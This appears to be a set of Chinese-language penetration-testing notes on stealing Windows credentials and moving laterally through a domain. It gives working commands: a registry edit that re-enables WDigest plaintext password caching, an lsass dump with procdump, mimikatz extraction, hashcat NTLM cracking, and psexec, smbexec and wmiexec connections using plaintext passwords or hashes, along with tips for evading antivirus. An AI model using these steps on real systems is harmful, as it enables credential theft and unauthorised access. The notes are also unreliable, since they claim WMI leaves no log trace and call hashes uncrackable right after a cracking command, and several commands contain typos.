域用户和普通用户的区别


Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码
Windows2012以下版本如安装KB2871997补丁,也会导致无法获取明文密码
Windows系统LM HASH及NTLM Hash加密算法,个人系统在Windows vista后,服务器系统在Windows 2003以后,认证方式均为NTLM Hash。
针对以上情况,我们提供了4种方式解决此类问题
1.利用哈希hash传递(pth,ptk等)进行移动
2.利用其他服务协议(SMB,WMI等)进行哈希移动
3.利用注册表操作开启Wdigest Auth值进行获取
4.利用工具或第三方平台(Hachcat)进行破解获取

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f




#密码获取
如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法
运行procdump在当前目录下生成lsass.dmp文件
mimikatz上执行:
sekurlas::minidump lsass.dmp
sekurlas::logonPasswords full

Hashcat 破解获取Windows NTML Hash
hashcat -a 0 -m 1000 file --force

-m, —hash-type=NUM           哈希类别，其NUM值参考其帮助信息下面的哈希类别值，其值为数字。如果不指定m值则默认指md5，例如-m 1800是sha512 Linux加密。


#连接工具
psexec第一种:使用系统自带的psexec先有ipc链接,psexec需要明文或hash传递
net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator
psexec \\102.168.3.32 -s cmd #需要先有ipc链接 -s以system权限运行

psexec第二种:使用github下载的psexec加强版 不用建立IPC 直接提供明文账户密码
而且可以使用哈希密码

哈希是不可逆的 无法破解
所以如果可以使用哈希密码非常方便
需要用到一个非官方的库impacket


smbexec无需先ipc链接 明文或哈市传递


WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统下痕迹
官方自带的WMIC 明文传递 无回显(缺点,功能比较尴尬)
改进方法
借助一个wmiexec.vbs文件


psexec smb wmi 协议可真多啊


#域横向移动以上服务bash批量利用-python编译exe


如果免杀无法通过怎么办？
使用PTH&PTK&PTT进行哈希传递




